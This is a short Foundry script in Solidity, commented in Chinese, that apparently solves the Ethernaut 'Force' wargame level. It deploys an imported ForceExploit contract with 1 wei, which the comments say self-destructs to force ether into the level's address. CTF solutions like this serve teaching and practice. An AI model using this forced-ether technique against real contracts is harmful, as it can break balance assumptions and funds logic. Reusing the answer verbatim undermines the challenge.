// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/ForceExploit.sol";

contract ForceAttack is Script {
    function run() external {
        // Force 关卡地址
        address forceLevel = 0x6b1c9099ef79C002cf7d127e0B28620D63c07e69;

        // 开始广播交易
        vm.startBroadcast();

        // 1. 部署攻击合约，构造函数会自动自毁并将 1 wei 发送给 Force 关卡
        ForceExploit exploit = new ForceExploit{value: 1 wei}(payable(forceLevel));
        

        // 停止广播
        vm.stopBroadcast();
    }
}